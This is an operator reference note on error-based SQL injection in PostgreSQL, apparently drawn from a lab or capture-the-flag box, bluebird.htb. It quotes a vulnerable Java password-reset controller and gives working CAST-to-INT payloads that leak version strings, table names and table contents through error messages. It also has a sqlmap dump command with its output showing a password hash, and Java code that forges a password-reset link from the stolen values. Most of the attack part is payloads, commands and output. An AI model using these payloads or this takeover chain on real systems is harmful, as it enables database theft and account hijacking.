---
technique: "Error-Based SQLi"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Error-Based SQLi.md"
source_sha256: "f0957c66fd0a5e6ed6b0036a400190c266c303c7f4c8c2d196ea588c8c3baab7"
curator_version: 2
review_status: imported-unreviewed
---

# Error-Based SQLi

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: sqlmap.

## Quick index — payloads & commands in this note
- `sql: // AuthController.java (Lines 121-164)`
- `sql: ' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--@bluebird`
- `sql: ' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as`
- `sql: ';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS IN`
- `bash: sqlmap -r x.req \`
- `bash: +----+----------+--------------------------------------------------------------+----------`
- `java: import org.springframework.util.DigestUtils;`

## Playbook (operator notes)

# Error-Based SQLi

## Example

```sql
// AuthController.java (Lines 121-164)

@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletRequest request, HttpServletResponse response) throws IOException {
    if (email.isEmpty()) {
        response.sendRedirect("/forgot?e=Please+fill+out+all+fields");
        return null;
    } else {
        Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
        Matcher m = p.matcher(email);
        if (!m.matches()) {
        response.sendRedirect("/forgot?e=Invalid+email!");
        return null;
        } else {
        try {
            String sql = "SELECT * FROM users WHERE email = '" + email + "'";
            User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
            Long var10000 = user.getId();
            String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
            var10000 = user.getId();
            String passwordResetLink = "https://bluebird.htb/reset?uid=" + var10000 + "&code=" + passwordResetHash;
            logger.error("TODO- Send email with link [" + passwordResetLink + "]");
            response.sendRedirect("/forgot?e=Please+check+your+email+for+the+password+reset+link");
            return null;
        } catch (EmptyResultDataAccessException var11) {
            response.sendRedirect("/forgot?e=Email+does+not+exist");
            return null;
        } catch (Exception var12) {
            String ipAddress = request.getHeader("X-FORWARDED-FOR");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }

            if (ipAddress.equals("127.0.1.1")) {
                model.addAttribute("errorMsg", var12.getMessage());
                model.addAttribute("errorStackTrace", Arrays.toString(var12.getStackTrace()));
            } else {
                model.addAttribute("errorMsg", "500 Internal Server Error");
                model.addAttribute("errorStackTrace", "Something happened on our side. Please try again later.");
            }

            return "error";
        }
        }
    }
}
```

`' or 1=1--@bluebird.htb`

Generic Response

Lets assume we would get a stack trace somehow

## **Exploiting the SQL Injection**

- **A popular technique when it comes to `error-based SQL injection` is casting a unsuitable `STRING` to an `INT` because the value will be displayed in the error message**
- To test this out, we can use the payload `' and 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb` to try and leak the version of the database

`PostgreSQL` fails to convert `VERSION()` to an `INT` as expected and so it prints the value out in the error message which is returned to us. The same technique can be used to leak pretty much anything from the database; you just need to get creative.

```sql
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb
```

Or you could use [STRING_AGG](https://www.postgresql.org/docs/9.1/sql-expressions.html#SYNTAX-AGGREGATES) to select all table names at once like this:

```sql
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb
```

If it is possible to `stack queries` in the specific `SQL injection` vulnerability you are targetting, you can even use [XML functions](https://www.postgresql.org/docs/9.4/functions-xml.html) to dump entire tables or databases at once like this:

```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb
```

## Using SQLMap

```bash
sqlmap -r x.req \
	--dbms postgresql \
	--suffix "--@bluebird.htb" \
	--batch \
	-D public \
	-T users \
	-C id,username,password,email \
	--where "username='potus4'" \
	--dump
```

```bash
+----+----------+--------------------------------------------------------------+---------------+
| id | username | password                                                     | email         |
+----+----------+--------------------------------------------------------------+---------------+
| 10 | potus4   | $2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a | james@usa.gov |
+----+----------+--------------------------------------------------------------+---------------+
```

```java
import org.springframework.util.DigestUtils;

public class Main {
    public static void main(String[] args) {
        String passwordResetHash = DigestUtils.md5DigestAsHex((10 + ":" + "james@usa.gov" + ":" + "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a").getBytes());
        String passwordResetLink = "https://bluebird.htb/reset?uid=" + 10 + "&code=" + passwordResetHash;
        System.out.println("Password reset link: " + passwordResetLink);
    }
}

// Output //
https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Error-Based SQLi.md`
